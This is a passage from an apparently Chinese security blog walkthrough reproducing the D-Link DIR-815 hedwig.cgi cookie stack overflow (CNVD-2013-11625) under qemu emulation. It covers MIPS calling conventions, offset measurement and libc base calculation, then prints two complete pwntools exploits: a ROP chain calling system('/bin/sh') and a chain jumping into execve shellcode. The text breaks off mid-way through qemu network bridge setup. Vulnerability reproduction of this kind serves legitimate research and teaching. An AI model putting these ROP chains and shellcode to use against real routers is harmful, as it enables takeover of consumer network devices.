href="#构造mips的rop寻找gadget所需的工具" class="headerlink" title="构造mips的rop寻找gadget所需的工具"></a><strong>构造mips的rop寻找gadget所需的工具</strong></h3><h4 id="mipsrop"><a href="#mipsrop" class="headerlink" title="mipsrop"></a>mipsrop</h4><p>安装方法:<a href="https://blog.csdn.net/XiDPPython/article/details/148194489?spm=1001.2014.3001.5501">IDA插件 MIPSROP的安装和使用方法-CSDN博客</a><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/35.png"></p><p>或者使用</p><h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><p><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/36.png"></p><p><code>感觉mipsrop更好用</code></p><h3 id="MIPS基础知识"><a href="#MIPS基础知识" class="headerlink" title="MIPS基础知识"></a><strong>MIPS基础知识</strong></h3><p>mips架构(32位下的mipsel)的特性</p><ol><li>叶子函数和非叶子函数<br><code>叶子函数</code> 是指<code>没有调用任何别子函数的函数</code>，它的返回地址会存放在 <code>$ra寄存器</code> 中，在叶子函数结束的时候程序会通过 <code>$ra寄存器</code> 进行跳转返回，如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/37.png"></li></ol><p><code>非叶子函数</code> 是指<code>调用了其他子函数的函数</code>， 它的返回地址 <code>$ra</code> 会在程序开始的时候通过 <code>sw指令</code> 存放到栈上，如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/38.png"><br>这是因为它其中调用了别的函数会改变它的 <code>$ra寄存器</code> 的值所以需要依靠栈来保存地址<br>然后在函数结束的时候再通过 <code>lw指令</code> 取出并跳转返回<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/39.png"></p><ol start="2"><li><p>流水线效应<br>最为常见的就是 <code>跳转指令</code> 比如 <code>jalr</code> 导致的 <code>分支延迟效应</code><br>而 <code>分支跳转语句</code> 后面的那条语句叫做 <code>分支延迟槽</code><br>就是说，当它跳转指令填充好跳转地址，但是还没来得及跳转过去的时候，跳转指令的下一条指令(分支延迟槽)就已经执行了<br>也就是说mips架构在执行跳转指令的时候<code>会先执行跳转指令的后一条指令，然后再进行跳转</code></p></li><li><p>缓存不一致性<br>指的是 <code>指令缓存区--Instruction Cache</code> 和 <code>数据缓存区--Data Cache</code> 的同步需要一定的时间<br>比如，我们将一段shellcode写入到栈上，那么此时shellcode还属于数据缓存区，如果我们直接跳转过去执行就会出现一些问题，因此我们需要调用一下 <code>sleep函数</code> 先停一下，让 <code>数据缓存区</code> 能够变成 <code>指令缓冲区</code> 然后再进行跳转这样就不会出错了，虽然直接跳转可能也不会出错但是sleep一下更加稳妥</p></li></ol><h2 id="使用qemu用户态模拟"><a href="#使用qemu用户态模拟" class="headerlink" title="使用qemu用户态模拟"></a><strong>使用qemu用户态模拟</strong></h2><h3 id="step1-测量偏移量"><a href="#step1-测量偏移量" class="headerlink" title="step1 测量偏移量"></a><strong>step1 测量偏移量</strong></h3><p>进入 <code>squashfs-root</code> 文件夹中<br>执行下面这条指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic <span class="number">2000</span> &gt; payload</span><br></pre></td></tr></table></figure><p>并且创建下面这个脚本并运行它</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义输入数据和相关变量</span></span><br><span class="line">INPUT=&quot;XiDP=Pwner&quot;                          # 发送的数据内容</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)                 # 计算内容长度</span><br><span class="line">COOKIE=&quot;uid=`cat payload`&quot;   </span><br><span class="line"> </span><br><span class="line">echo $INPUT | qemu-mipsel -L ./ -0 &quot;hedwig.cgi&quot; -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;2333&quot; -g 1234 ./htdocs/cgibin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-0 参数用于强制设置程序的 argv[0] 值， 后面的 -E 是设置环境变量了 -g 指定端口 <span class="built_in">echo</span> 可以实现post的功能</span></span><br></pre></td></tr></table></figure><p>开启 <code>另外一个终端</code>，创建下面这个脚本叫做 <code>mygdb.sh</code>, 然后执行指令 <code>gdb-multiarch -x mygdb.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mygdb.sh</span></span><br><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 127.0.0.1:1234                                  </span><br></pre></td></tr></table></figure><p>如果我们没有搞错什么，那么我们将得到下面这幅画面<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/40.png"></p><p>通过图中这个地址被修改的值我们可以计算出我们所需要的偏移量， 得到偏移量为1009<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/41.png"></p><p>知道溢出量后我们还需要寻找libc的基地址</p><h3 id="step2-计算libc基地址"><a href="#step2-计算libc基地址" class="headerlink" title="step2 计算libc基地址"></a><strong>step2 计算libc基地址</strong></h3><p>这么我们是使用 <code>qemu用户态</code> 来模拟路由器程序，这时我们直接在 <code>pwndbg</code> 中使用 <code>vmmap指令</code> 是找不到 <code>libc_base</code> 的,大致会出现下图所示情况，我们在图中是看不到 <code>libc.so.0</code> 的初始地址的<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/42.png"></p><p>所以我们需要在程序里面找到一个libc函数的真实地址，然后利用这个函数相对于libc基地址的偏移量来求出libc的基地址<br>我们在下面这两个地方打上断点，那么在跳转的时候我们就可以得知memset函数的真实地址了，而知道真实地址我们还需要memset函数相对于libc基地址的偏移量<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/43.png"><br>(这里为什么选用两个memset函数? 这里因为第一次是跳转到延迟绑定的地址，第二次延迟绑定结束才是真实是memset函数地址)</p><p>下面使用gdb运行到此处查看memset的真实地址<br>第一次得到的是延迟绑定的地址，t9中存放<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/44.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/45.png"></p><p>第二次得到的才是真实地址<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/46.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/47.png"><br>由此可得，<code>memset函数</code> 的地址为 <code>0x2b333a20</code></p><p>然后我们查看软连接，发现程序的libc文件本体其实是 <code>libuClibc-0.9.30.1.so</code> 文件<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/48.png"></p><p>将该文件拖入IDA中进行分析，得知 <code>memset</code> 的偏移量为 <code>0x034A20</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/49.png"><br>下面就可以计算出 <code>libc_base = 0x2b333a20 - 0x034A20 = 0x2B2FF000</code><br>然后还可以找一下system函数的偏移量为 <code>0x53200</code></p><h3 id="step3-编写并运行exp"><a href="#step3-编写并运行exp" class="headerlink" title="step3 编写并运行exp"></a><strong>step3 编写并运行exp</strong></h3><p>接着我们就可以开始编写exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base = <span class="number">0x2B2FF000</span> <span class="comment"># 这里的libc_base每个人都是不一样的需要修改</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">1009</span>-<span class="number">36</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x159F4</span>) <span class="comment"># s1  move $t9, $s0</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>                   <span class="comment">#s2</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x5A448</span>) <span class="comment"># s3  /bin/sh</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">2</span>)               <span class="comment">#s4-s5</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># s6  addiu $s0, 1</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">2</span>)               <span class="comment">#s7-s8</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x13F8C</span>) <span class="comment"># ret_addr  move $a0, $s3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">post_content = <span class="string">&quot;XiDP=Pwner&quot;</span></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=10 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    -g 1234 ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00013F8C                 move    $a0, $s3</span></span><br><span class="line"><span class="string">.text:00013F90                 move    $t9, $s6</span></span><br><span class="line"><span class="string">.text:00013F94                 jalr    $t9</span></span><br><span class="line"><span class="string">.text:00013F98                 move    $a1, $s1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:000159F4                 move    $t9, $s0</span></span><br><span class="line"><span class="string">.text:000159F8                 jalr    $t9 ; mempcpy</span></span><br><span class="line"><span class="string">.text:000159FC                 addiu   $a1, (asc_599FC - 0x60000)  # &quot;/&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:00032A98                 addiu   $s0, 1</span></span><br><span class="line"><span class="string">.text:00032A9C                 li      $s2, 1</span></span><br><span class="line"><span class="string">.text:00032AA0</span></span><br><span class="line"><span class="string">.text:00032AA0 loc_32AA0:                               # CODE XREF: sub_32850:loc_32A88↑j</span></span><br><span class="line"><span class="string">.text:00032AA0                 move    $t9, $s1</span></span><br><span class="line"><span class="string">.text:00032AA4                 jalr    $t9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>上述所使用的exp为winmt师傅在其博客中所写，winmt师傅在博客中表示该exp无法打通qemu用户态，但是我本地打了一下发现如果直接打是无法打通的，但是如果加上一个pause，然后gdb-multiarch去连接，调试到最后却是可以打通的，如下图，有点怪，不知道啥原因<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/50.png"></p><p>但是下面的shellcode版本是不论如何都可以打通的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x2B2FF000</span> <span class="comment"># 这里的libc_base每个人都是不一样的需要修改</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">post_content = <span class="string">&quot;XiDP=Pwner&quot;</span></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运行之后效果如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/51.png"></p><h2 id="使用qemu系统态模拟"><a href="#使用qemu系统态模拟" class="headerlink" title="使用qemu系统态模拟"></a>使用qemu系统态模拟</h2><h3 id="step1-下载对应内核及镜像"><a href="#step1-下载对应内核及镜像" class="headerlink" title="step1 下载对应内核及镜像"></a><strong>step1 下载对应内核及镜像</strong></h3><p>想要使用qemu系统态模拟相对就要复杂一点了，我们需要下载对应的 <code>内核</code> 以及 <code>镜像</code><br>下载地址: <a href="https://people.debian.org/~aurel32/qemu/mipsel/">Index of &#x2F;~aurel32&#x2F;qemu&#x2F;mipsel</a><br>到上面这个网站下下 <code>debian_squeeze_mipsel_standard.qcow2</code>镜像以及 <code>vmlinux-3.2.0-4-4kc-malta</code> 内核<br>如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/52.png"></p><h3 id="step2-创建网桥"><a href="#step2-创建网桥" class="headerlink" title="step2 创建网桥"></a><strong>step2 创建网桥</strong></h3><p>开始模拟之前我们需要开启物理机的ip转发功能，以及创建网桥来连接到<code>qemu</code>虚拟机</p><p>首先安装网络配置工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>然后修改 <code>interfaces</code> 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>一些新版本的Ubuntu里面可能没有 <code>interfaces</code> 这个问题<br>我们可以使用下面指令来安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ifupdown</span><br></pre></td></tr></table></figure><p>修改 <code>interfaces</code> 文件内容如下(修改之前可以先备份一份， <code>sudo cp /etc/network/interfaces /etc/network/interfaces.brk</code>)<br>下面使用 <code>ip addr</code> 指令来查看我们系统使用的是什么接口 一般是 <code>eth0</code> 或 <code>ens33</code></p><p>eth0如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">up ifconfig eth0 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> up</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports eth0</span><br><span class="line">bridge_maxwait <span class="number">0</span></span><br></pre></td></tr></table></figure><p>ens33如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">up ifconfig ens33 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> up</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_maxwait <span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里修改完之后可以使用指令 <code>sudo /etc/init.d/networking restart</code> 来重启一下网络配置<br>再备份一次 <code>sudo cp /etc/network/interfaces /etc/network/interfaces.brk2</code><br>备份好之后我们可以写一个脚本用来在两个不同的版本之间切换<br>我写的脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># net_cg </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 功能说明：切换网络配置文件并重启服务</span></span><br><span class="line"><span class="comment"># 用法：net_cg [0|1]</span></span><br><span class="line"><span class="comment"># 参数：0 - 使用 interfaces.brk；1 - 使用 interfaces.brk2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    0)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在切换至 interfaces.brk 配置...&quot;</span></span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">rm</span> /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/network/interfaces.brk /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> /etc/init.d/networking restart</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;配置切换完成！&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    1)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在切换至 interfaces.brk2 配置...&quot;</span></span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">rm</span> /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/network/interfaces.brk2 /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> /etc/init.d/networking restart</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;配置切换完成！&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># 无参数时提示用法</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;用法：<span class="variable">$0</span> [0|1]&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;  0 - 使用 interfaces.brk 配置&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;  1 - 使用 interfaces.brk2 配置&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="comment"># 非法参数报错</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;错误：无效参数 &#x27;<span class="variable">$1</span>&#x27;&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;支持的参数：0 或 1&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>在 <code>/etc/qemu-ifup</code> 文件中写入下面内容(如果没有则需要创建，然后使用 <code>sudo chmod a+x /etc/qemu-ifup</code>)<br>注意是<code>写入</code>，<code>不是</code>改成下面内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo <span class="string">&quot;Executing /etc/qemu-ifup&quot;</span></span><br><span class="line">echo <span class="string">&quot;Bringing up $1 for bridge mode...&quot;</span></span><br><span class="line">sudo /sbin/ifconfig $<span class="number">1</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> promisc up</span><br><span class="line">echo <span class="string">&quot;Adding $1 to br0...&quot;</span></span><br><span class="line">sudo /sbin/brctl addif br0 $<span class="number">1</span></span><br><span class="line">sleep <span class="number">2</span></span><br></pre></td></tr></table></figure><p>还需要<code>开启物理机的转发功能</code>(写成脚本如下)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle 